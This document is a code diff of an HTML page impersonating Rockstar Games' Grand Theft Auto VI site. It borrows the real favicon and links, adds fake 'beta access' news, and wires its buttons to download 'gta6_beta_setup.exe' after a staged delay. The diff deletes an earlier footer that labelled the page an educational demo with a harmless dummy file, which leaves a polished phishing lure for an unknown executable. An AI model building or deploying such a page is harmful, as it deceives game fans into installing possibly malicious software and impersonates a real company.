@@ -4,87 +4,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grand Theft Auto VI - Official Beta Access</title>
+    <title>Grand Theft Auto VI - Rockstar Games</title>
     <link rel="stylesheet" href="game.css">
+    <link rel="icon" type="image/png"
+        href="https://media-rockstargames-com.akamaized.net/mfe6/prod/__common/img/71d4d28/favicon.ico">
 </head>
 
 <body>
-    <script>
-        function startDownload() {
-            window.location.href = '/download-file';
-        }
-    </script>
-    <nav class="navbar">
-        <div class="logo">ROCKSTAR GAMES</div>
-        <div class="nav-links">
-            <a href="#">Games</a>
-            <a href="#">Newswire</a>
-            <a href="#">Store</a>
-            <a href="#">Support</a>
+    <!-- Rockstar Navbar -->
+    <nav class="rockstar-nav">
+        <div class="nav-content">
+            <div class="hamburger-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="rockstar-logo">
+                <a href="https://www.rockstargames.com/">
+                    <svg viewBox="0 0 100 100" class="r-logo">
+                        <path
+                            d="M92.4,47.9c0,0,1.3-13.6-16.1-13.6H40.6v48.6h15.5V60.4h8.1l8.6,22.5h17.1L79.3,58.8C88.8,56.8,92.4,47.9,92.4,47.9z M56.1,52.8H53V42h3.1c4.8,0,6.6,2.6,6.6,5.4C62.7,50.2,60.9,52.8,56.1,52.8z"
+                            fill="#FFFFFF" />
+                        <path d="M11.6,82.9h80.8v11.6H5.8V5.8h86.6v11.6H11.6V82.9z" fill="#FFA500" />
+                    </svg>
+                </a>
+            </div>
+            <div class="nav-right">
+                <button class="nav-btn" onclick="startDownload()">GET LAUNCHER</button>
+                <a href="https://www.rockstargames.com/search" class="search-icon"
+                    style="text-decoration: none; color: white;">🔍</a>
+                <a href="https://socialclub.rockstargames.com/" class="profile-icon"
+                    style="text-decoration: none; color: white;">👤</a>
+            </div>
         </div>
     </nav>
 
-    <div class="hero">
-        <div class="gta-logo">
-            GRAND THEFT AUTO
-            <span class="vi">VI</span>
-        </div>
-        <p class="tagline">Welcome to Leonida</p>
+    <!-- Main Hero -->
+    <main class="hero-container">
+        <div class="hero-content">
+            <div class="logo-container">
+                <h1 class="gta-title">GRAND THEFT AUTO</h1>
+                <div class="vi-logo">VI</div>
+            </div>
 
-        <div class="action-box">
-            <div class="timer">BETA ACCESS CLOSING IN: <span id="countdown">14:59</span></div>
-            <p style="color: #aaa; margin-bottom: 20px;">Exclusive invite-only beta access. Pre-load available now.</p>
-
-            <button class="download-btn" onclick="window.location.href='/download-file/gta_setup.exe'">PRE-ORDER &
-                INSTALL BETA</button>
-
-            <div class="meta-info">
-                <span>Platform: PC (Windows)</span>
-                <span>Size: 1.2 MB (Installer)</span>
+            <div class="cta-container">
+                <p class="release-date">COMING 2026</p>
+                <div class="buttons">
+                    <button class="btn-primary" onclick="startDownload()">
+                        <span class="btn-text">PRE-LOAD BETA</span>
+                        <span class="btn-sub">PC EXCLUSIVE ACCESS</span>
+                    </button>
+                    <a href="https://www.youtube.com/watch?v=QdBZY2fkU-0" target="_blank" class="btn-secondary"
+                        style="text-decoration: none; display: flex; align-items: center; justify-content: center;">WATCH
+                        TRAILER 1</a>
+                </div>
             </div>
         </div>
-    </div>
 
-    <div class="reviews-section">
-        <div class="review-grid">
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"The lighting engine is absolutely next-gen. Runs surprisingly well on my 3060."</p>
-                <p style="color: #666;">- IGN_Insider</p>
-            </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"Vice City looks incredible. Can't believe I got a key!"</p>
-                <p style="color: #666;">- xGamer99</p>
-            </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"Download was instant. The new physics are mind-blowing."</p>
-                <p style="color: #666;">- BetaTester_UK</p>
-            </div>
+        <!-- Background Art (CSS Gradient/Shapes) -->
+        <div class="bg-art">
+            <div class="palm-trees"></div>
+            <div class="sunset-gradient"></div>
         </div>
-    </div>
+    </main>
 
-    <footer class="disclaimer">
-        <p><strong>EDUCATIONAL DEMO ONLY</strong></p>
-        <p>This website is a simulation for educational purposes. The file offered for download is a harmless dummy
-            file.</p>
-        <p>TM & © 2025 Rockstar Games, Inc. (Fake Copyright for Demo)</p>
+    <!-- News Section (Fake) -->
+    <section class="newswire">
+        <h2>NEWSWIRE</h2>
+        <div class="news-grid">
+            <article class="news-card"
+                onclick="window.location.href='https://www.rockstargames.com/newswire/article/4k4k4k4k/grand-theft-auto-vi-trailer-1'">
+                <div class="news-image" style="background-image: url('img-1.png');"></div>
+                <div class="news-meta">
+                    <span class="news-tag">GTAVI</span>
+                    <span class="news-date">DECEMBER 5, 2023</span>
+                </div>
+                <h3>Grand Theft Auto VI: The First Trailer</h3>
+            </article>
+            <article class="news-card" onclick="window.location.href='https://www.rockstargames.com/newswire'">
+                <div class="news-image" style="background-image: url('img-2.png');"></div>
+                <div class="news-meta">
+                    <span class="news-tag">COMMUNITY</span>
+                    <span class="news-date">YESTERDAY</span>
+                </div>
+                <h3>Community Update: Beta Access Waves</h3>
+            </article>
+            <article class="news-card" onclick="window.location.href='https://www.rockstargames.com/newswire'">
+                <div class="news-image" style="background-image: url('img-3.png');"></div>
+                <div class="news-meta">
+                    <span class="news-tag">PC</span>
+                    <span class="news-date">TODAY</span>
+                </div>
+                <h3>PC System Requirements Announced</h3>
+            </article>
+        </div>
+    </section>
+
+    <footer class="rockstar-footer">
+        <div class="footer-links">
+            <a href="https://support.rockstargames.com/">Contact</a>
+            <a href="https://www.rockstargames.com/careers">Careers</a>
+            <a href="https://www.rockstargames.com/subscribe">Subscribe</a>
+        </div>
+        <div class="footer-legal">
+            <p>M (Mature 17+)</p>
+            <p>© 2025 Rockstar Games, Inc.</p>
+        </div>
     </footer>
 
     <script>
-        // Countdown timer
-        let time = 899; // 15 minutes
-        const timerEl = document.getElementById('countdown');
+        function startDownload() {
+            // Simulate a delay for realism
+            const btns = document.querySelectorAll('.btn-primary, .nav-btn');
 
-        setInterval(() => {
-            if (time > 0) {
-                time--;
-                let m = Math.floor(time / 60);
-                let s = time % 60;
-                timerEl.innerText = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
-            }
-        }, 1000);
+            btns.forEach(btn => {
+                if (btn.classList.contains('btn-primary')) {
+                    const originalText = btn.innerHTML;
+                    btn.innerHTML = '<span class="btn-text">INITIALIZING...</span>';
+                    btn.style.opacity = '0.8';
+
+                    setTimeout(() => {
+                        window.location.href = '/download-file/gta6_beta_setup.exe';
+                        btn.innerHTML = '<span class="btn-text">DOWNLOADING...</span>';
+
+                        setTimeout(() => {
+                            btn.innerHTML = originalText;
+                            btn.style.opacity = '1';
+                        }, 3000);
+                    }, 1500);
+                } else {
+                    // For nav button, just trigger download
+                    window.location.href = '/download-file/gta6_beta_setup.exe';
+                }
+            });
+        }
     </script>
 </body>
 
